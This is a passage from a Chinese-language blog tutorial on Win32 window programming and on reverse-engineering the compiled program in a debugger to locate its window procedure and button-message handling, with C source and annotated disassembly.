HINSTANCE hPrevInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     LPSTR     lpCmdLine,</span></span><br><span class=\"line\"><span class=\"params\">                     <span class=\"type\">int</span>       nCmdShow)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> \t<span class=\"comment\">// <span class=\"doctag\">TODO:</span> Place code here.</span></span><br><span class=\"line\">\t<span class=\"comment\">///OutputDebugString(&quot;hahahaha&quot;);</span></span><br><span class=\"line\">\t<span class=\"comment\">//OutputDebugString(&quot;hello world\\n&quot;);</span></span><br><span class=\"line\">\t<span class=\"comment\">//DWORD a = 11122;</span></span><br><span class=\"line\">\t<span class=\"comment\">//DbgPrintf(&quot;%d = 111&quot;, a);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tTCHAR className[] = <span class=\"string\">&quot;shabi&quot;</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//创建一个自己的窗口</span></span><br><span class=\"line\">\tWNDCLASS wndclass = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\twndclass.hbrBackground = (HBRUSH)COLOR_HIGHLIGHTTEXT;</span><br><span class=\"line\">\twndclass.lpfnWndProc = WindowProc;</span><br><span class=\"line\">\twndclass.lpszClassName = className;</span><br><span class=\"line\">\twndclass.hInstance = hInstance;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//注册 必须给所有的成员赋值调用时</span></span><br><span class=\"line\">\tRegisterClass(&amp;wndclass);</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tHWND hwnd = CreateWindowEx(</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>,                              <span class=\"comment\">// Optional window styles.</span></span><br><span class=\"line\">\t\tclassName,                     <span class=\"comment\">// Window class</span></span><br><span class=\"line\">\t\tTEXT(<span class=\"string\">&quot;Learn to Program Windows&quot;</span>),    <span class=\"comment\">// Window text</span></span><br><span class=\"line\">\t\tWS_OVERLAPPEDWINDOW,            <span class=\"comment\">// Window style</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// Size and position</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//相对于父窗口的x y坐标</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//窗口的宽度和高度</span></span><br><span class=\"line\">\t\tCW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,       <span class=\"comment\">// Parent window    </span></span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,       <span class=\"comment\">// Menu</span></span><br><span class=\"line\">\t\thInstance,  <span class=\"comment\">// Instance handle</span></span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>        <span class=\"comment\">// Additional application data</span></span><br><span class=\"line\">\t\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (hwnd == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tShowWindow(hwnd, SW_SHOW);</span><br><span class=\"line\"></span><br><span class=\"line\">\tMSG msg;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (GetMessage(&amp;msg, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TranslateMessage(&amp;msg);</span><br><span class=\"line\">        DispatchMessage(&amp;msg);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">LRESULT CALLBACK <span class=\"title function_\">WindowProc</span><span class=\"params\">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (uMsg)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> WM_DESTROY:</span><br><span class=\"line\">        PostQuitMessage(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">case</span> WM_PAINT:</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            PAINTSTRUCT ps;</span><br><span class=\"line\">            HDC hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// All painting occurs here, between BeginPaint and EndPaint.</span></span><br><span class=\"line\"></span><br><span class=\"line\">            FillRect(hdc, &amp;ps.rcPaint, (HBRUSH) (COLOR_WINDOW+<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            EndPaint(hwnd, &amp;ps);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"comment\">//处理当前程序不关心的消息类型</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3dpbmRvd3Mvd2luMzIvbGVhcm53aW4zMi9jcmVhdGluZy1hLXdpbmRvdw==\">创建窗口 - Win32 apps | Microsoft Learn</span></p>\n<p>消息类型</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MDIxMTgwL2FydGljbGUvZGV0YWlscy8xMDAwMjA5MTE=\">Windows 消息类型及说明（全面）_战胜。的博客 - CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3dpbmRvd3Mvd2luMzIvd2lubXNnL2Fib3V0LW1lc3NhZ2VzLWFuZC1tZXNzYWdlLXF1ZXVlcw==\">关于消息和消息队列 - Win32 apps | Microsoft Learn</span></p>\n<blockquote>\n<p>如果直接定义而不初始化，那么没初始化的参数的地方还是 CC，系统执行到这里就会产生中断，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230311112852539.png\" alt=\"image-20230311112852539\"></p>\n<p>WNDCLASS wndclass = {0}；</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401061   mov         dword ptr [ebp-30h],0</span><br><span class=\"line\">00401068   mov         ecx,9</span><br><span class=\"line\">0040106D   xor         eax,eax</span><br><span class=\"line\">0040106F   lea         edi,[ebp-2Ch]</span><br><span class=\"line\">00401072   rep stos    dword ptr [edi]</span><br></pre></td></tr></table></figure>\n<p>系统会循环填充所有参数为 0</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230311113120902.png\" alt=\"image-20230311113120902\"></p>\n</blockquote>\n<h3 id=\"入口程序分析\"><a class=\"markdownIt-Anchor\" href=\"#入口程序分析\">#</a> 入口程序分析</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int APIENTRY WinMain(HINSTANCE hInstance,</span><br><span class=\"line\">                     HINSTANCE hPrevInstance,</span><br><span class=\"line\">                     LPSTR     lpCmdLine,</span><br><span class=\"line\">                     int       nCmdShow)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0040124C  |&gt; \\50            push    eax</span><br><span class=\"line\">0040124D  |.  FF75 9C       push    [local.25]</span><br><span class=\"line\">00401250  |.  56            push    esi</span><br><span class=\"line\">00401251  |.  56            push    esi                                                 ; /pModule</span><br><span class=\"line\">00401252  |.  FF15 2C504000 call    dword ptr ds:[&lt;&amp;KERNEL32.GetModuleHandleA&gt;]         ; \\GetModuleHandleA,获取imagebase</span><br><span class=\"line\">00401258  |.  50            push    eax</span><br><span class=\"line\">00401259  |.  E8 A2FDFFFF   call    00401000</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00401000  /$  83EC 4C       sub     esp,0x4C                                 \t\t\t; esp+4c返回地址，第一个参数esp+50,esp寻址</span><br><span class=\"line\">00401003  |.  A1 4C604000   mov     eax,dword ptr ds:[0x40604C]</span><br><span class=\"line\">00401008  |.  66:8B0D 50604&gt;mov     cx,word ptr ds:[0x406050]</span><br><span class=\"line\">0040100F  |.  56            push    esi</span><br><span class=\"line\">00401010  |.  8B7424 54     mov     esi,dword ptr ss:[esp+0x54]</span><br><span class=\"line\">00401014  |.  57            push    edi</span><br><span class=\"line\">00401015  |.  894424 08     mov     dword ptr ss:[esp+0x8],eax</span><br><span class=\"line\">00401019  |.  66:894C24 0C  mov     word ptr ss:[esp+0xC],cx</span><br><span class=\"line\">0040101E  |.  B9 09000000   mov     ecx,0x9</span><br><span class=\"line\">00401023  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00401025  |.  8D7C24 30     lea     edi,dword ptr ss:[esp+0x30]</span><br><span class=\"line\">00401029  |.  C74424 2C 000&gt;mov     dword ptr ss:[esp+0x2C],0x0</span><br><span class=\"line\">00401031  |.  8D5424 08     lea     edx,dword ptr ss:[esp+0x8]</span><br><span class=\"line\">00401035  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401037  |.  8D4424 2C     lea     eax,dword ptr ss:[esp+0x2C]</span><br><span class=\"line\">0040103B  |.  C74424 48 0E0&gt;mov     dword ptr ss:[esp+0x48],0xE</span><br><span class=\"line\">00401043  |.  50            push    eax                                                 ; /pWndClass</span><br><span class=\"line\">00401044  |.  C74424 34 F01&gt;mov     dword ptr ss:[esp+0x34],004010F0                    ; |windproc函数地址</span><br><span class=\"line\">0040104C  |.  895424 54     mov     dword ptr ss:[esp+0x54],edx                         ; |</span><br><span class=\"line\">00401050  |.  897424 40     mov     dword ptr ss:[esp+0x40],esi                         ; |</span><br><span class=\"line\">00401054  |.  FF15 C4504000 call    dword ptr ds:[&lt;&amp;USER32.RegisterClassA&gt;]             ; \\RegisterClassA</span><br><span class=\"line\">0040105A  |.  6A 00         push    0x0                                                 ; /lParam = NULL</span><br><span class=\"line\">0040105C  |.  56            push    esi                                                 ; |hInst</span><br><span class=\"line\">0040105D  |.  6A 00         push    0x0                                                 ; |hMenu = NULL</span><br><span class=\"line\">0040105F  |.  6A 00         push    0x0                                                 ; |hParent = NULL</span><br><span class=\"line\">00401061  |.  68 00000080   push    0x80000000                                          ; |Height = 80000000 (-2147483648.)</span><br><span class=\"line\">00401066  |.  68 00000080   push    0x80000000                                          ; |Width = 80000000 (-2147483648.)</span><br><span class=\"line\">0040106B  |.  68 00000080   push    0x80000000                                          ; |Y = 80000000 (-2147483648.)</span><br><span class=\"line\">00401070  |.  68 00000080   push    0x80000000                                          ; |X = 80000000 (-2147483648.)</span><br><span class=\"line\">00401075  |.  68 0000CF00   push    0xCF0000                                            ; |Style = WS_OVERLAPPED|WS_MINIMIZEBOX|WS_MAXIMIZEBOX|WS_SYSMENU|WS_THICKFRAME|WS_CAPTION</span><br><span class=\"line\">0040107A  |.  8D4C24 2C     lea     ecx,dword ptr ss:[esp+0x2C]                         ; |</span><br><span class=\"line\">0040107E  |.  68 30604000   push    00406030                                            ; |WindowName = &quot;Learn to Program Windows&quot;</span><br><span class=\"line\">00401083  |.  51            push    ecx                                                 ; |Class</span><br><span class=\"line\">00401084  |.  6A 00         push    0x0                                                 ; |ExtStyle = 0</span><br><span class=\"line\">00401086  |.  FF15 C8504000 call    dword ptr ds:[&lt;&amp;USER32.CreateWindowExA&gt;]            ; \\CreateWindowExA</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230329194051583.png\" alt=\"image-20230329194051583\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230329194443915.png\" alt=\"image-20230329194443915\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 找回调函数</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tTCHAR className[] = <span class=\"string\">&quot;shabi&quot;</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//创建一个自己的窗口</span></span><br><span class=\"line\">\tWNDCLASS wndclass = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\twndclass.hbrBackground = (HBRUSH)COLOR_HIGHLIGHTTEXT;</span><br><span class=\"line\">\twndclass.lpfnWndProc = WindowProc;    <span class=\"comment\">// 回调函数</span></span><br><span class=\"line\">\twndclass.lpszClassName = className;</span><br><span class=\"line\">\twndclass.hInstance = hInstance;</span><br><span class=\"line\">\t<span class=\"comment\">//注册 必须给所有的成员赋值调用时</span></span><br><span class=\"line\">\tRegisterClass(&amp;wndclass);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//register 上面会有回调函数</span></span><br><span class=\"line\"><span class=\"comment\">//第二个参数就是回调函数</span></span><br><span class=\"line\"><span class=\"number\">00401191</span>  |.  <span class=\"number\">50</span>            push    eax                                                ; /pWndClass</span><br><span class=\"line\"><span class=\"number\">00401192</span>  |.  C74424 <span class=\"number\">4</span>C <span class=\"number\">0E0</span>&gt;mov     dword ptr ss:[esp+<span class=\"number\">0x4C</span>],<span class=\"number\">0xE</span>                        ; |</span><br><span class=\"line\"><span class=\"number\">0040119</span>A  |.  C74424 <span class=\"number\">34</span> <span class=\"number\">501</span>&gt;mov     dword ptr ss:[esp+<span class=\"number\">0x34</span>],<span class=\"number\">00401250</span>                   ; |</span><br><span class=\"line\"><span class=\"number\">004011</span>A2  |.  <span class=\"number\">895424</span> <span class=\"number\">54</span>     mov     dword ptr ss:[esp+<span class=\"number\">0x54</span>],edx                        ; |</span><br><span class=\"line\"><span class=\"number\">004011</span>A6  |.  <span class=\"number\">897424</span> <span class=\"number\">40</span>     mov     dword ptr ss:[esp+<span class=\"number\">0x40</span>],esi                        ; |</span><br><span class=\"line\"><span class=\"number\">004011</span>AA  |.  FF15 C8604000 call    dword ptr ds:[&lt;&amp;USER32.RegisterClassA&gt;]            ; \\RegisterClassA</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"子窗口\"><a class=\"markdownIt-Anchor\" href=\"#子窗口\">#</a> 子窗口</h3>\n<p>按钮本质也是子窗口</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230330174237192.png\" alt=\"image-20230330174237192\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230330181247150.png\" alt=\"image-20230330181247150\"></p>\n<p>[esp+8] == WM_COMMAND</p>\n<p>[esp+8] == WM_COMMAND &amp;&amp; [esp + 0xc] == 0x3eb</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 11111.cpp : Defines the entry point for the application.</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdio.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;Tools.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">HINSTANCE hAppInstance;</span><br><span class=\"line\"></span><br><span class=\"line\">LRESULT CALLBACK <span class=\"title function_\">WindowProc</span><span class=\"params\">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">CreateButton</span><span class=\"params\">(HWND hwnd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HWND hwndPushButton;</span><br><span class=\"line\">\tHWND hwndCheckBox;</span><br><span class=\"line\">    HWND hwndRadio;</span><br><span class=\"line\"> </span><br><span class=\"line\">    hwndPushButton = CreateWindow(</span><br><span class=\"line\">        TEXT(<span class=\"string\">&quot;button&quot;</span>),    <span class=\"comment\">// 系统预定义</span></span><br><span class=\"line\">        TEXT(<span class=\"string\">&quot;普通按钮&quot;</span>),</span><br><span class=\"line\">        <span class=\"comment\">//WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON,            </span></span><br><span class=\"line\">        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON,</span><br><span class=\"line\">        <span class=\"number\">10</span>, <span class=\"number\">10</span>,</span><br><span class=\"line\">        <span class=\"number\">80</span>, <span class=\"number\">20</span>,</span><br><span class=\"line\">        hwnd,</span><br><span class=\"line\">        (HMENU)<span class=\"number\">1001</span>,    <span class=\"comment\">//子窗口ID                        </span></span><br><span class=\"line\">        hAppInstance,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获取系统自定义button的WNDCLASS结构</span></span><br><span class=\"line\">\tTCHAR szBuffer[<span class=\"number\">0x20</span>];</span><br><span class=\"line\">\tGetClassName(hwndPushButton, szBuffer, <span class=\"number\">0x20</span>); <span class=\"comment\">//in,out,in,获取classname</span></span><br><span class=\"line\">\t </span><br><span class=\"line\">\tWNDCLASS wc;</span><br><span class=\"line\">\tGetClassInfo(hAppInstance, szBuffer, &amp;wc); <span class=\"comment\">//获取classname中其他信息</span></span><br><span class=\"line\">\tOutputDebugStringF(<span class=\"string\">&quot;--&gt;%s\\n&quot;</span>, wc.lpszClassName);</span><br><span class=\"line\">\tOutputDebugStringF(<span class=\"string\">&quot;--&gt;%x\\n&quot;</span>, wc.lpfnWndProc);</span><br><span class=\"line\">\t<span class=\"comment\">//--&gt;Button</span></span><br><span class=\"line\">\t<span class=\"comment\">//--&gt;7710abd3</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\thwndCheckBox = CreateWindow(</span><br><span class=\"line\">        TEXT(<span class=\"string\">&quot;button&quot;</span>), <span class=\"comment\">//系统定义样式</span></span><br><span class=\"line\">        TEXT(<span class=\"string\">&quot;复选框&quot;</span>),</span><br><span class=\"line\">        <span class=\"comment\">//WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX,            </span></span><br><span class=\"line\">        WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX,</span><br><span class=\"line\">        <span class=\"number\">10</span>, <span class=\"number\">40</span>,</span><br><span class=\"line\">        <span class=\"number\">80</span>, <span class=\"number\">20</span>,</span><br><span class=\"line\">        hwnd,</span><br><span class=\"line\">        (HMENU)<span class=\"number\">1002</span>,    <span class=\"comment\">//子窗口ID                        </span></span><br><span class=\"line\">        hAppInstance,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    hwndRadio = CreateWindow(</span><br><span class=\"line\">        TEXT(<span class=\"string\">&quot;button&quot;</span>),</span><br><span class=\"line\">        TEXT(<span class=\"string\">&quot;单选按钮&quot;</span>),</span><br><span class=\"line\">        <span class=\"comment\">//WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON | BS_AUTORADIOBUTTON,            </span></span><br><span class=\"line\">        WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON,</span><br><span class=\"line\">        <span class=\"number\">10</span>, <span class=\"number\">70</span>,</span><br><span class=\"line\">        <span class=\"number\">80</span>, <span class=\"number\">20</span>,</span><br><span class=\"line\">        hwnd,</span><br><span class=\"line\">        (HMENU)<span class=\"number\">1003</span>,    <span class=\"comment\">//子窗口ID                        </span></span><br><span class=\"line\">        hAppInstance,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> APIENTRY <span class=\"title function_\">WinMain</span><span class=\"params\">(HINSTANCE hInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     HINSTANCE hPrevInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     LPSTR     lpCmdLine,</span></span><br><span class=\"line\"><span class=\"params\">                     <span class=\"type\">int</span>       nCmdShow)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> \t<span class=\"comment\">// <span class=\"doctag\">TODO:</span> Place code here.</span></span><br><span class=\"line\">\t<span class=\"comment\">///OutputDebugString(&quot;hahahaha&quot;);</span></span><br><span class=\"line\">\t<span class=\"comment\">//OutputDebugString(&quot;hello world\\n&quot;);</span></span><br><span class=\"line\">\t<span class=\"comment\">//DWORD a = 11122;</span></span><br><span class=\"line\">\t<span class=\"comment\">//DbgPrintf(&quot;%d = 111&quot;, a);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\thAppInstance = hInstance;</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tTCHAR className[] = <span class=\"string\">&quot;shabi&quot;</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//创建一个自己的窗口</span></span><br><span class=\"line\">\tWNDCLASS wndclass = &#123;<span class=\"number\">0</span>&#125;;</span><br><span 